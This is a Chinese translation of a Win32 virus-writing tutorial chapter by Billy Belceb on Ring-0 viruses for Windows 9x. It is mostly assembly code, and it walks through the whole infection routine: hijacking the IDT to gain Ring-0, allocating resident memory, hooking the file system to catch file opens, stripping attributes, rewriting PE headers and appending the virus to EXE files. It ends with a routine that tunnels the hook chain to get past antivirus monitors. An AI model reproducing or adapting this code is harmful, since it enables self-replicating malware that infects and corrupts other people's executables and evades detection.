
# Billy Belceb 病毒编写教程 for Win32

> 原文：[`www.pediy.com/kssd/pediy06/pediy65786.htm`](https://www.pediy.com/kssd/pediy06/pediy65786.htm)

## 【Ring-0，在上帝级编码】

自由！你热爱吗？在 `Ring-0`，我们在限制之外，那里没有任何限制。因为 `Micro$oft` 的无能，我们有很多的方法跳到这个级别，一个理论上不能到达的地方。但是，我们可以在 `Win9X` 系统中跳转到 `Ring-0`:)

例如，`Micro$oft` 的傻瓜们没有保护中断表。这在我的眼中是一个巨大的安全失败。但话又说过来，如果我们可以利用它编写病毒，它就不是一个错误了，它就是一个礼物！;)

### % 来到 Ring-0 %

好了，我将解释在我看来最简单的方法，那就是 `IDT` 修改。`IDT`(Interrupt Descriptor Table)不是一个固定的地址，所以我们必须使用指令来定位它，那就是 `SIDT`。

| `SIDT` - Store Interrupt Descriptor Table (286+ 专有) |
| :--- |
| **用法:** `SIDT 目标` |
| **修改标记:** 无 |

存储 `Interrupt Descriptor Table` (`IDT`) 寄存器到指定操作数中。

Operands | 808X | 286 | 386 | 486 | Bytes
:--- | :--- | :--- | :--- | :--- | :---
`mem64` | - | 12 | 9 | 10 | 5
`0F 01 /1 SIDT mem64` | Store `IDTR` to `mem64` | | | |

如果我们使用 `SIDT` 还不够清晰的话，它仅仅保存 `IDT` 的 `FWORD` 偏移(`WORD`:`DWORD` 格式)。而且，如果我们知道了 `IDT` 在哪里，我们可以修改中断向量，并使它们指向我们的代码。展示给你的是 `Micro$oft` 的蹩脚的代码编写者。让我们继续我们的工作。在使中断向量改变后指向我们的代码(并把它们保存，以备以后恢复)之后，我们只要调用我们已经钩住(`hook`)的中断即可。如果看起来现在对你还不清晰，下面是通过修改 `IDT` 的方法来跳到 `Ring-0` 的代码。

```asm
;---------从这儿开始剪切----------------------------------------------------
        .586p                               ; Bah... simply for phun.
        .model  flat                        ; Hehehe i love 32 bit stuph ;)
extrn   ExitProcess:PROC
extrn   MessageBoxA:PROC
Interrupt        equ     01h             ; Nothing special
        .data
 szTitle         db      "Ring-0 example",0          
 szMessage       db      "I'm alive and kicking ass",0
;------------------------------------------------------------------------------
;好了，这一段对你来说已经相当清晰了，是吗? :)
;------------------------------------------------------------------------------
        .code
 start:
        push    edx
        sidt    [esp-2]                     ; Interrupt table to stack
        pop     edx
        add     edx,(Interrupt*8)+4         ; Get interrupt vector
;------------------------------------------------------------------------------
; 这相当简单。SIDT，正如我以前解释过的，把 IDT 的地址保存到一个内存地址中，为了
; 我们的简单起见，我们直接使用了堆栈。接下来是一个 POP 指令，它把 IDT 的偏移地址
; 装载到寄存器(这里为 EDX)中。下一行是仅仅为了定位我们想要的中断的偏移地址。这
; 就和在 DOS 下玩 IVT 一样...
;------------------------------------------------------------------------------
        mov     ebx,[edx]
        mov     bx,word ptr [edx-4]     ; Whoot Whoot
;------------------------------------------------------------------------------
; 相当简单。它仅仅是为了将来恢复，把 EDX 指向的内容保存到 EBX 中
;------------------------------------------------------------------------------
        lea     edi,InterruptHandler
        mov     [edx-4],di
        ror     edi,16                   ; Move MSW to LSW
        mov     [edx+2],di
;------------------------------------------------------------------------------
; 我以前是不是说过了它有多简单? :)这里，我们给 EDI 指向新中断处理的偏移地址，下
; 面的 3 行是把那个处理放到 IDT 中。为什么那样 ROR 呢?嗯，如果你使用 ROR,SHR 或 SAR 都
; 没关系，因为它仅仅把中断处理偏移的 MSW(More Significant Word)移到 LSW (Less
; Significant Word)中，然后保存。
;------------------------------------------------------------------------------
        push    ds                       ; Safety safety safety...
        push    es
        int     Interrupt               ; Ring-0 comez hereeeeeee!!!!!!!
        pop     es
        pop     ds
;------------------------------------------------------------------------------
;Mmmm...很有意思。我们为了安全起见，把 DS 和 ES 压栈了，避免一些罕见的错误，但是
;它可以不用它工作，相信我。因为中断已经被补丁过了，除了设置这个中断之外，不用
;做其它任何事情了...现在我们已经在 RING0 里了，下面的代码是继续 InterruptHandler
;------------------------------------------------------------------------------
        mov     [edx-4],bx                 ; Restore old interrupt values
        ror     ebx,16                   ; ROR, SHR, SAR... who cares?
        mov     [edx+2],bx

 back2host:
        push    00h                     ; Sytle of MessageBox
        push    offset szTitle          ; Title of MessageBox
        push    offset szMessage        ; The message itself
        push    00h                     ; Handle of owner
        call    MessageBoxA             ; The API call itself
        push    00h
        call    ExitProcess
        ret
;------------------------------------------------------------------------------
;现在除了恢复原先的保存在 EBX 中的中断向量外，没做其它更多的事情。然后，我们
;返回代码到主体。(好了，只是假设是那样) ;)
;------------------------------------------------------------------------------
 InterruptHandler:                      
        pushad
        ; 下面是你的代码 :)
        popad
        iretd                      
 end start
;---------从这儿为止剪切----------------------------------------------------
```

现在我们可以访问它了。我想所有人都可以做它，但是现在对于普通病毒在第一次访问 `Ring-0` 时又面临一个问题:我们为什么现在做呢?

### % 在 Ring-0 下编写病毒 %

我喜欢开始有一点点算法的教程，所以你将来我们该怎样在 `Ring-0` 编写病毒的时候碰到一个。

1. 测试运行的操作系统(`OS`): 如果 `NT`，跳过病毒并返回目录给主体
2. 跳到 `Ring-0`(`IDT`, `VMM` 插入或调用门技术)
3. 执行一个中断，它包含了感染代码。
   - 3.1. 获得一个放置病毒驻留的地方(开辟页或者在堆中)
   - 3.2. 把病毒放进去
   - 3.3. 钩住文件系统并保存旧的钩子
     - 3.3.1. 在 `FS Hook` 中，首先要保存所有的参数并修复 `ESP`
     - 3.3.2. 参数压栈
     - 3.3.3. 然后检查系统是否试图打开一个文件，如果没有，跳过
     - 3.3.4. 如果试图打开，首先把文件名转化成 `ASCII` 码
     - 3.3.5. 然后检查是否是一个 `EXE` 文件。如果不是，跳过感染
     - 3.3.6. 打开，读文件头，操作，重写，添加和关闭
     - 3.3.7. 调用旧的钩子
     - 3.3.8. 跳过所有的返回到 `ESP` 的参数
     - 3.3.9. 返回
   - 3.4. 返回
4. 恢复旧的中断向量
5. 返回控制权给主体

这个算法有一点点大，无论如何我可以使它更概要，但是我更愿意直接行动。`OK`，来吧，`Let's go`!

#### 当文件运行时测试操作系统

因为在 `NT` 下 `Ring-0` 有些问题(`Super`，解决它们!)，我们必须我们所在的操作系统，如果不是 `Win9X` 平台就返回控制权给主体。好了，有很多方法去做这个：

- 使用 `SEH`
- 检查代码段的值

好了，我假设你已经知道了怎么玩 `SEH`，对吗？我在另外一章已经解释了它的用法，所以现在是去读一下它的时候了。关于第二个可能的事情，下面是代码:

```asm
mov     ecx,cs
xor     cl,cl
jecxz   back2host
```

这个例子的解释:在 `Windows NT` 中，代码段总是小于 `100h`，而在 `Win95/98` 中总是大一些，所以我们清除它的低位字节，而且如果它比 `100` 小，`ECX` 将为 `0`，反过来，如果它比 `100` 大，它将不会是 `0`。优化了，耶。

### %跳到 Ring-0 并执行中断%

好了，已经在这个文档中的访问 `Ring-0` 部分解释了最简单的方法，所以关于这个我就不多说了。

### %我们已经在 Ring-0 里了...该做什么呢?%

在 `Ring-0` 里面，代之 `API`，我们有 `VxD` 服务。`VxD` 服务以下面的形式访问:

```asm
int     20h
dd      vxd_service
```

`vxd_service` 占两个字，`MSW` 表明 `VxD` 号，而 `LSW` 表明我们从 `VxD` 中调用的函数。例如，我将使用 `VMM_PageModifyPermissions` 值：

```text
dd      0001000Dh
          |_______|_____| Service  000Dh _PageModifyPermissions
                |_______ VxD      0001h VMM
```

所以，为了调用它，我们必须如下做:

```asm
int     20h
dd      0001000Dh
```

一个非常聪明的编码方式是编写一个宏来自动做这个，并使号码为 `EQUates`。但是，那是你的选择。这个值是固定的，所以，在 `Win95` 和 `Win98` 中一样。不要担心，`Ring-0` 的一个好处是你不需要在 `Kernel` 中或其它地方搜索偏移地址(当我们使用 `API` 的时候)，因为没有必要做它，必须硬编码。

这里我必须声明一个我们在编写一个 `Ring-0` 病毒的时候必须清除的非常重要的事情：`int 20h` 和地址，我演示给你的访问 `VxD` 的函数，在内存中如下:

```asm
call    dword ptr [VxD_Service] ; 回调服务
```

你可以认为有点愚蠢，但是，它非常重要，而且真的很痛苦，因为病毒用这些 `CALL` 而不是 `int` 和服务的双字偏移来复制到宿主，这使得病毒只能在你的计算机上执行，而不能在其他人的机器上运行。在现实生活中，这个麻烦有许多解决方法。它们中的其中的一个，正如 `Win95.Padania` 所做的，在每个 `VxD` 调用后面修复它。另外的方法是:做一个所有的偏移地址的表来修复，直接做等等。下面是我的代码，而且你可以在我的 `Garaipena` 和 `PoshKiller` 中看到它:

```asm
VxDFix:
        mov     ecx,VxDTbSz             ; 传送例程的次数
        lea     esi,[ebp+VxDTblz]      ; 指向表的指针
@lo0pz:lodsd                           ; 把当前表的偏移地址装载到 EAX 中
        add     eax,ebp                 ; 加上 delta 偏移
        mov     word ptr [eax],20CDh    ; 放到那个地址中
```



```
mov edx,dword ptr [eax+08h] ; 获得 VxD 服务值
mov dword ptr [eax+02h],edx ; 并恢复它
loop @lo0pz ; 校正另外一个
ret

VxDTblz label byte ; 所有有 VXD 调用的偏移地址表
dd (offset @@1)
dd (offset @@2)
dd (offset @@3)
dd (offset @@4)
; [...] 所有其它的调用 VxD 函数的指针必须列在这里 :)

VxDTbSz equ (($-offset VxDTblz)/4) ; 个数
```

我希望你理解了每个我们调用的 VxD 函数必须有它的偏移地址。哦，我几乎忘了另外一件重要的事情：如果你正在使用我的 VxD 修正过程，你的 `VxDCall` 宏该怎样。下面给出：

```
VxDCall macro VxDService
local @@@@@@
int 20h ; CD 20 +00h
dd VxDService ; XX XX XX XX +02h
jmp @@@@@@ ; EB 04 +06h
dd VxDService ; XX XX XX XX +08h
@@@@@@:
endm
```

OK，现在我们需要一个驻留的地方。我个人偏向于放在 net 堆中，因为它很容易编写(懒人的规则!)。

---------------------------------------------------------------------------

**IFSMgr\_GetHeap - 开辟一块 net 堆**

+ 除非 `IFSMgr` 执行了 `SysCriticalInit`，否则这个服务将不合法
+ 这个函数使用 C6 386 `_cdecl` 调用顺序
+ 入口 -> TOS - 需要大小
+ 出口 -> `EAX` - 堆块的地址，如果失败为 0
+ 使用 C 寄存器 (eax, ecx, edx, flags)

---------------------------------------------------------------------------

以上是一些 Win95 DDK 的信息。让我们看看关于这个的例子：

```
InterruptHandler:
pushad ; Push 所有寄存器
push virus_size+1024 ; 我们需要的内存 (virus_size+buffer)
; 当你使用缓冲区的时候，更好
; 把它加上更多的字节

@@1: VxDCall IFSMgr_GetHeap
pop ecx
```

够清楚了吧？正如 DDK 所说的，如果它失败了，它将在 `EAX` 中返回给我们 0，所以检查可能的失败。接下来的 `POP` 非常重要，因为 VxD 的大多数服务不修正堆栈，所以我们在调用 VxD 函数之前压栈的值还在堆栈中。

```
or eax,eax ; cmp eax,0
jz back2ring3
```

如果函数成功了，我们在 `EAX` 中得到了我们必须移动的病毒主体的地址，那么 Let's go!

```
mov byte ptr [ebp+semaphore],0 ; Coz infection puts it in 1
mov edi,eax ; Where move virus
lea esi,ebp+start ; What to move
push eax ; Save memory address for later
sub ecx,1024 ; We move only virus_size
rep movsb ; Move virus to its TSR location ;)
pop edi ; Restore memory address
```

我们在一个内存地址中的是病毒，准备 TSR 的，对吗?而且在 `EDI` 中是病毒在内存中开始的地址，所以我们可以把它作为下个函数的 `delta offset` :)好了，我们现在需要 hook 文件系统了对吗？OK，有一个函数可以做这个工作。很惊讶，是把？ Micro$oft 微软工程师为我们做了累活。

---------------------------------------------------------------------------

**IFSMgr\_InstallFileSystemApiHook - 安装一个文件系统 api hook**

这个服务为调用者安装一个文件系统 api hook。这个 hook 在 IFS manager 和一个 FSD 之间，钩子可以看任何 IFS manager 对 FSD 的任何调用。

这个函数使用 C6 386 `_cdecl` 调用顺序

```
ppIFSFileHookFunc
IFSMgr_InstallFileSystemApiHook( pIFSFileHookFunc HookFunc )
```

入口 TOS - 将要安装作为钩子的函数的地址
出口 EAX - 指向在这个链中的包含以前钩子的地址变量
使用 C 寄存器

---------------------------------------------------------------------------

清楚了吧？如果不，我希望你在看了一些代码之后，理解了它。好了，让我们钩住文件系统(hook `FileSystem`)...

```
lea ecx,[edi+New_Handler] ; (vir address in mem + handler offs)
push ecx ; Push it

@@2: VxDCall IFSMgr_InstallFileSystemApiHook ; Perform the call
pop ecx ; Don't forget this, guy
mov dword ptr [edi+Old_Handler],eax ; EAX=Previous hook

back2ring3:
popad
iretd ; return to Ring-3. Yargh
```

好了，我们已经看完了 Ring-0 病毒的安装部分。现在，我们必须编写文件系统(`FileSystem`)的处理部分了:)简单，但是否如你所想?:)

**`FileSystem Handler`**: 真正有趣!!!

耶，下面是驻留感染它自己，但是我们在开始之前不得不做些事情。首先，我们必须对堆栈做一个安全拷贝，也就是说保存 `ESP` 内容到 `EBP` 寄存器中。然后，我们应该把 `ESP` 减去 `20h`，为了修正堆栈指针。让我们看看一些代码:

```
New_Handler equ $-(offset virus_start)

FSA_Hook:
push ebp ; Save EBP content 4 further restorin
mov ebp,esp ; Make a copy of ESP content in EBP
sub esp,20h ; And fix the stack
```

现在，因为我们的函数要被系统用一些参数调用，我们应该 push 它们，就像原先的处理程序所做的。要 push 的参数从 `EBP+08h` 到 `EBP+1Ch`，包含它们，并和 `IOREQ` 结构相关。

```
push dword ptr [ebp+1Ch] ; pointer to IOREQ structure.
push dword ptr [ebp+18h] ; codepage that the user string was
; passed in on.
push dword ptr [ebp+14h] ; kind of resource the operation is
; being performed on.
push dword ptr [ebp+10h] ; the 1-based drive the operation is
; being performed on (-1 if UNC).
push dword ptr [ebp+0Ch] ; function that is being performed.
push dword ptr [ebp+08h] ; address of the FSD function that
; is to be called for this API.
```

现在，我们已经把应该 push 的参数 push 到正确的地方了，所以对它们不要再担心了。现在，我们必须检查你将要操作的 `IFSFN` 函数。下面你得到的是最重要的小列表:

---------------------------------------------------------------------------

**传送给 `IFSMgr_CallProvider` 的 `IFSFN` 函数 ID**

```
IFSFN_READ equ 00h ; read a file
IFSFN_WRITE equ 01h ; write a file
IFSFN_FINDNEXT equ 02h ; LFN handle based Find Next
IFSFN_FCNNEXT equ 03h ; Find Next Change Notify
IFSFN_SEEK equ 0Ah ; Seek file handle
IFSFN_CLOSE equ 0Bh ; close handle
IFSFN_COMMIT equ 0Ch ; commit buffered data for handle
IFSFN_FILELOCKS equ 0Dh ; lock/unlock byte range
IFSFN_FILETIMES equ 0Eh ; get/set file modification time
IFSFN_PIPEREQUEST equ 0Fh ; named pipe operations
IFSFN_HANDLEINFO equ 10h ; get/set file information
IFSFN_ENUMHANDLE equ 11h ; enum file handle information
IFSFN_FINDCLOSE equ 12h ; LFN find close
IFSFN_FCNCLOSE equ 13h ; Find Change Notify Close
IFSFN_CONNECT equ 1Eh ; connect or mount a resource
IFSFN_DELETE equ 1Fh ; file delete
IFSFN_DIR equ 20h ; directory manipulation
IFSFN_FILEATTRIB equ 21h ; DOS file attribute manipulation
IFSFN_FLUSH equ 22h ; flush volume
IFSFN_GETDISKINFO equ 23h ; query volume free space
IFSFN_OPEN equ 24h ; open file
IFSFN_RENAME equ 25h ; rename path
IFSFN_SEARCH equ 26h ; search for names
IFSFN_QUERY equ 27h ; query resource info (network only)
IFSFN_DISCONNECT equ 28h ; disconnect from resource (net only)
IFSFN_UNCPIPEREQ equ 29h ; UNC path based named pipe operation
IFSFN_IOCTL16DRIVE equ 2Ah ; drive based 16 bit IOCTL requests
IFSFN_GETDISKPARMS equ 2Bh ; get DPB
IFSFN_FINDOPEN equ 2Ch ; open an LFN file search
IFSFN_DASDIO equ 2Dh ; direct volume access
```

---------------------------------------------------------------------------

对我们来说的第一件事，我们感兴趣的唯一的函数是 `24h`，那就是说打开。系统几乎每时每刻都在调用那个函数，所以对它没有任何问题。为这个编码就和你能想象的一样简单:)

```
cmp dword ptr [ebp+0Ch],24h ; Check if system opening file
jnz back2oldhandler ; If not, skip and return to old h.
```

现在开始有意思的。我们知道这里系统请求文件打开，所以现在该我们了。首先，我们应该检查我们是否在进行我们自己的调用...简单，仅仅加一个小变量，它将出现一些问题。Btw，我几乎忘了，获得 `delta offset` :)

```
pushad
call ring0_delta ; Get delta offset of this

ring0_delta:
pop ebx
```



```
    sub     ebx, offset ring0_delta
    cmp     byte ptr [ebx+semaphore], 00h ; Are we the ones requesting
    jne     pushnback            ; the call?
    inc     byte ptr [ebx+semaphore] ; For avoid process our own calls
    pushad
    call    prepare_infection    ; We'll see this stuff later
    call    infection_stuff
    popad
    dec     byte ptr [ebx+semaphore] ; Stop avoiding :)

pushnback:
    popad
```

现在我将继续介绍处理程序本身，然后，我将解释我是怎么做这些例程的，`prepare_infection` 和 `infection_stuff`。如果系统正在请求一个调用，我们就退出我们将要处理的例程，OK?现在，我们必须编写调用旧的 FileSystem hook 的例程。当你还记得(我假设你没有 alzheimer)，我们 push 了所有参数，所以我们该做的唯一的事情是装到寄存器中，旧地址没关系，然后调用那个内存位置。然后，我们把 `ESP` 加 `18h`(为了能够获得返回地址)，完了。你将最好看看一些代码，所以，你将看到：

```
back2oldhandler:
    db      0B8h                   ; MOV EAX,imm32 opcode
Old_Handler    equ  $-(offset virus_start)
    dd      00000000h              ; here goes the old handler.
    call    [eax]
    add     esp, 18h               ; Fix stack (6*4)
    leave                            ; 6 = num. paramz. 4 = dword size.
    ret                             ; Return
```

## 感染准备

这是 Ring-0 代码的主要部分的一方面。让我们现在看看 Ring-0 编写代码的细节。当我们在钩子处理中的时候，有两个调用，对吗？这不是必须的，但是我为了使代码更简单，那么做了，因为我喜欢使事情结构化。

在第一次调用的时候，我调用的 `prepare_infection` 仅仅因为一个原因做了一件事情。系统作为一个参数给我们的文件名，但是我们有一个问题。系统以 UNICODE 形式给我们的，而且对我们来说它没有什么用。所以，我们需要把它转换成 ASCII 码，对吗？我们有一个 VxD 服务可以为我们做这件事。它的名字:`UniToBCSPath`。下面是你喜欢的源代码。

```
prepare_infection:
    pushad                      ; Push all
    lea     edi,[ebx+fname]    ; Where to put ASCII file name
    mov     eax,[ebp+10h]

    cmp     al, 0FFh           ; Is it in UNICODE?
    jz      wegotdrive         ; Oh, yeah!

    add     al, "@"            ; Generate drive name
    stosb
    mov     al, ":"            ; Add a :
    stosb

wegotdrive:
    xor     eax, eax
    push    eax               ; EAX = 0 -> Convert to ASCII
    mov     eax, 100h
    push    eax               ; EAX = Size of string to convert
    mov     eax, [ebp+1Ch]
    mov     eax, [eax+0Ch]     ; EAX = Pointer to string
    add     eax, 4
    push    eax
    push    edi               ; Push offset to file name

@@3:  VxD
    Call
    UniToBCSPath
    add     esp, 10h         ; Skip parameters returnet
    add     edi, eax
    xor     eax, eax         ; Make string null-terminated
    stosb
    popad                    ; Pop all
    ret                      ; Return
```

## 感染本身

下面我将告诉你怎样到达直到你你必须的应用感染后的文件应该有的新的 PE 头和节头的值。但是，我不会解释怎么操作它们了，不是因为我懒，仅仅是因为这是 Ring-0 代码编写一章，而不是 PE 感染一章。这个部分和 FileSystem 钩子代码的 `infection_stuff` 部分相符。首先，我们必须检查我们将要操作的文件是否是一个.EXE 文件还是其它不感兴趣的文件。所以，首先，我们必须在文件名字里寻找 0 值，它告诉我们它的末尾。这编写起来很简单：

```
infection_stuff:
    lea     edi, [ebx+fname]     ; Variable with the file name

getend:
    cmp     byte ptr [edi], 00h  ; End of filename?
    jz      reached_end         ; Yep
    inc     edi                 ; If not, search for another char
    jmp     getend

reached_end:
```

我们在 `EDI` 里是 ASCII 字符串里的 0 值，正如你知道的，它标志着字符串的结尾，也就是在这种情况下，文件名。下面是我们的主要检查，看看它是否是一个.EXE 文件，如果它不是，跳过感染。我们还可以检查.SCR(Windows 屏保)，正如你知道的，它们也是可执行文件...这就是你的选择。下面给你一些代码：

```
    cmp     dword ptr [edi-4], "EXE." ; Look if extension is an EXE
    jnz     notsofunny
```

正如你能看到的，我比较了 `EDI-5` 次。

现在我们知道了那个文件是一个 EXE 文件:)所以该是移除它的属性，打开文件，修改相关域，关闭文件并恢复属性的时候了。所有这些函数由另外一个 IFS 服务完成，那就是 `IFSMgr_Ring0_FileIO`。我没有找到关于全部这个的文档，总之也没有必要，它有很多的函数，正如我以前所说的，所有我们需要函数仅仅是为了进行文件感染。让我们 VxD 服务 `IFSMgr_Ring0_FileIO` 传送到 `EAX` 中的数值：

```
-----------------------------------------------------------------------
;函数定义在 ring-0 的 API 函数列表中：
;说明：大多数函数是上下文相关的，除非被明确的规定了，也就是说，它们不使用当前线程的上下文。;R0_LOCKFILE 是唯一的例外－它总是使用当前线程的上下文。

R0_OPENCREATFILE         equ     0D500h  ; Open/Create a file
R0_OPENCREAT_IN_CONTEXT  equ     0D501h  ; Open/Create file in current contxt
R0_READFILE              equ     0D600h  ; Read a file, no context
R0_WRITEFILE             equ     0D601h  ; Write to a file, no context
R0_READFILE_IN_CONTEXT   equ     0D602h  ; Read a file, in thread context
R0_WRITEFILE_IN_CONTEXT  equ     0D603h  ; Write to a file, in thread context
R0_CLOSEFILE             equ     0D700h  ; Close a file
R0_GETFILESIZE           equ     0D800h  ; Get size of a file
R0_FINDFIRSTFILE         equ     04E00h  ; Do a LFN FindFirst operation
R0_FINDNEXTFILE          equ     04F00h  ; Do a LFN FindNext operation
R0_FINDCLOSEFILE         equ     0DC00h  ; Do a LFN FindClose operation
R0_FILEATTRIBUTES        equ     04300h  ; Get/Set Attributes of a file
R0_RENAMEFILE            equ     05600h  ; Rename a file
R0_DELETEFILE            equ     04100h  ; Delete a file
R0_LOCKFILE              equ     05C00h  ; Lock/Unlock a region in a file
R0_GETDISKFREESPACE      equ     03600h  ; Get disk free space
R0_READABSOLUTEDISK     equ     0DD00h  ; Absolute disk read
R0_WRITEABSOLUTEDISK    equ     0DE00h  ; Absolute disk write
-----------------------------------------------------------------------
```

迷人的函数，是吧？:)如果我们看看，它提醒了我们 DOS `int 21h` 函数。但是这个更好:)

好了，让我们保存旧的文件属性。正如你能看到的，这个函数是在我以前给你的列表中的，我们把这个参数(`4300h`)放到 `EAX` 中为了获得文件的属性到 `ECX` 中。所以，在那之后，我 push 它和文件名，它在 `ESI` 中。

```
    lea     esi, [ebx+fname]    ; Pointer to file name
    mov     eax, R0_FILEATTRIBUTES ; EAX = 4300h
    push    eax                 ; Save it goddamit
    VxDCall
    IFSMgr_Ring0_FileIO         ; Get attributes
    pop     eax                 ; Restore 4300h from stack
    jc      notsofunny         ; Something went wrong (?)
    push    esi                 ; Push pointer to file name
    push    ecx                 ; Push attributes
```

现在我们必须把它们去掉。没问题。设置文件属性的函数是，以前在 `IFSMgr_Ring0_FileIO` 中,但是现在是 `4301h`。就像你在 DOS 下看到的这个值:)

```
    inc     eax                 ; 4300h+1=4301h :)
    xor     ecx, ecx            ; No attributes sucker!
    VxDCall
    IFSMgr_Ring0_FileIO         ; Set new attributes (wipe'em)
    jc      stillnotsofunny    ; Error (?!)
```

现在我们有一个没有属性的等着我们的文件了...我们该做什么呢？呵呵，我认为你是聪明的。让我们打开它!:)就像所有病毒中的这个部分一样，我们不得不调用 `IFSMgr_Ring0_FileIO`，但是现在为打开文件传送到 `EAX` 中的是 `D500h`。

```
    lea     esi, [ebx+fname]    ; Put in ESI the file name
    mov     eax, R0_OPENCREATFILE ; EAX = D500h
    xor     ecx, ecx            ; ECX = 0
    mov     edx, ecx
    inc     edx                 ; EDX = 1
    mov     ebx, edx
    inc     ebx                 ; EBX = 2
    VxDCall
    IFSMgr_Ring0_FileIO
    jc      stillnotsofunny    ; Shit.
    xchg    eax, ebx            ; Optimize a bit, sucka! :)
```

现在我们在 `EBX` 中的是打开文件的句柄，所以如果你在文件关闭之前不使用这个文件将会完美，好吗?:)现在该是你读 PE 文件头并保存它(和操作它)的时候了，然后更新文件头，附加上病毒...这里我将仅仅解释怎样处理 PE 头的属性，因为它是这个教程的另外一部分了，而且我不想太多重复。我打算解释如何把 PE 头保存到我们的缓冲区中。它相当简单:如果你还记得，PE 头从偏移地址 `3Ch`(当然是从 BOF 开始)开始。然后我们必须读 4 字节(这个 `3Ch` 处的 `DWORD`),并在这个偏移地址处再次读，这次，是 `400h` 字节，足够处理整个 PE 头了。正如你能想象的，读文件中的函数是在很棒的 `IFSMgr_Ring0_FileIO` 中，而且你可以看到我以前给你的表中的正确号码，在 `R0_READFILE` 中。传递给这个函数的参数如下：

- `EAX` = `R0_READFILE` = `D600h`
- `EBX` = `File Handle`
- `ECX` = `Number of bytes to read`
- `EDX` = `Offset where we should read`
- `ESI` = `Where will go the read bytes`

```
    call    inf_delta          ; 如果你还记得，我们在 EBX 中是 delta offset

inf_delta:                     ; 但是打开文件之后，我们在 EBX 中是文件的句柄
    pop     ebp                ; 所以我们必须重新计算它。
    sub     ebp, offset inf_delta ;
    mov     eax, R0_READFILE   ; D600h
```



```
push    eax                         ; Save it for later
mov     ecx,4                       ; Bytes to read, a DWORD
mov     edx,03Ch                   ; Where read (BOF+3Ch)
lea     esi,[ebp+pehead]           ; There goez the PE header offzet
VxDCall IFSMgr_Ring0_FileIO        ; The VxDCall itself
pop     eax                         ; restore R0_READFILE from stack
mov     edx,dword ptr [ebp+pehead] ; Where the PE header begins
lea     esi,[ebp+header]           ; Where write the read PE header
mov     ecx,400h                   ; 1024 bytes, enough for all PE head.
VxDCall IFSMgr_Ring0_FileIO
```

现在我们通过看它的标志要看看我们刚才打开的文件是否是一个 PE 文件。我们在 `ESI` 中的是指向我们放置 PE 头的缓冲区，所以只要把 `ESI` 中的第一个 `DWORD` 和 `PE,0,0` 作比较即可(或者简单的用 `WORD` 和 `PE` 进行比较) ;)

```
cmp     dword ptr [esi],"EP"    ; 它是 PE 吗?
jnz     muthafucka
```

现在你该检查以前的感染了，如果以前已经感染过了，只要到诸如关闭文件的地方即可。正如我以前所说的，我将跳过修改 PE 头的代码，因为假设你已经知道怎么做了。好了，想象一些你已经合适地修改了缓冲区里的 PE 头(在我的代码里，变量叫做 `header`)。现在该是把新的头写到 PE 文件里的时候了。寄存器里的值应该是和 `R0_READFILE` 函数差不多的，我将这样写它们：

`EAX = R0_WRITEFILE = D601h`
`EBX = File Handle`
`ECX = Number of bytes to write`
`EDX = Offset where we should write`
`ESI = Offset of the bytes we want to write`

```
mov     eax,R0_WRITEFILE               ; D601h
mov     ecx,400h                       ; write 1024 bytez (buffer)
mov     edx,dword ptr [ebp+pehead]     ; where to write (PE offset)
lea     esi,[ebp+header]               ; Data to write
VxDCall IFSMgr_Ring0_FileIO
```

我们已经写完了头。现在，我们只要添加病毒即可。我决定把它添在 `EOF` 目录中，因为我的修改 PE 的方式...好了，我是用这种方法做的。但是不要担心，应用的的感染方法是很简单的，因为我假设你已经理解它是怎么工作的了。就在附加病毒主体之前，记住我们应该修正所有的 `VxDCall`，因为它们在调用的时候在内存中已经改变了。记住，我在这篇教程里面教给你的 `VxD` 修正过程。另外，当我们在 `EOF` 处添加的时候，我们应该知道它占多少字节。相当简单，我们在 `IFSMgr_Ring0_FileIO` 中有一个函数(为什么不呢!)来做这个工作: `R0_GETFILESIZE` 让我们看看它的输入参数:

`EAX = R0_GETFILESIZE = D800h`
`EBX = File Handle`

在 `EAX` 中返回给我们的是句柄对应的文件的大小，也就是我们试图感染的文件。

```
call    VxDFix                       ; Re-make all INT 20h's
mov     eax,R0_GETFILESIZE           ; D800h
VxDCall IFSMgr_Ring0_FileIO

                                    ; EAX = File size
mov     edx,R0_WRITEFILE             ; EDX = D601h
xchg    eax,edx                      ; EAX = D601; EDX = File size
lea     esi,[ebp+virus_start]        ; What to write
mov     ecx,virus_size               ; How much bytez to write
VxDCall IFSMgr_Ring0_FileIO
```

只剩下一些事情去做了。只要关闭文件并恢复它的旧的属性即可。当然关闭文件的函数是我们热爱的 `IFSMgr_Ring0_FileIO` 了，现在是函数 `D700h`。让我们看看它的输入参数:

`EAX = R0_CLOSEFILE = 0D700h`
`EBX = File Handle`

现在是它的代码:

`muthafucka:`

```
mov     eax,R0_CLOSEFILE
VxDCall IFSMgr_Ring0_FileIO
```

好了，只剩下一件事情去做了。恢复旧的属性。

`stillnotsofunny:`

```
pop     ecx                          ; Restore old attributos
pop     esi                          ; Restore ptr to FileName
mov     eax,4301h                   ; Set attributes function
VxDCall IFSMgr_Ring0_FileIO

notsofunny:
ret
```

终于完了! :) 另外，所有的这些"VxDCall IFSMgr_Ring0_FileIO"最好在一个子例程中，用一个简单的 `call` 来调用它：它更优化了(如果你你使用我给你的 `VxDCall` 宏)，它更好是因为只要把一个偏移放在 `VxDFix` 的表中就可以了。

%反 VxD 监视代码%

~~~~~~~

我必须不能忘记发现这个的人:Super/29A。此外，我应该解释这个东西是怎么回事。它和已经见过的 `InstallFileSystemApiHook` 服务有关，但是它没有被 `Micro$oft` 写成文档。`InstallFileSystemApiHook` 服务返回给我们一个有意思的结构：

`EAX + 00h -> Address of previous handler`
`EAX + 04h -> Hook_Info structure`

而且正如你所想的，最重要的是 `Hook_Info` 结构:

`00h -> 钩子处理的地址, 这个结构的第一个`
`04h -> 先前钩子处理的地址`
`08h -> 先前钩子的 Hook_Info 的地址`

所以，我们对这个结构进行递归搜索直到找到了第一个，被监视程序使用的链的顶部...然后我们必须修改它。代码？下面给出一部分 :)

`; EDI = Points to virus copy in system heap`

```
lea     ecx,[edi+New_Handler]        ; Install FileSystem Hook
push    ecx

@@2:    VxDCall IFSMgr_InstallFileSystemApiHook
pop     ecx
xchg    esi,eax                      ; ESI = Ptr actual hook
                                      ;       handler
push    esi
lodsd ; add esi,4                    ; ESI = Ptr to Hook Handler

tunnel: lodsd                         ; EAX = Previous Hook Handler
                                      ; ESI = Ptr to Hook_Info
xchg    eax,esi                      ; Very clear :)
add     esi,08h                      ; ESI = 3rd dword in struc:
                                      ;       previous Hook_Info
js      tunnel                       ; If ESI < 7FFFFFFF, it was
                                      ; the last one :)
                                      ; EAX = Hook_Info of the top
                                      ; chain
mov     dword ptr [edi+ptr_top_chain],eax ; Save in its var in mem
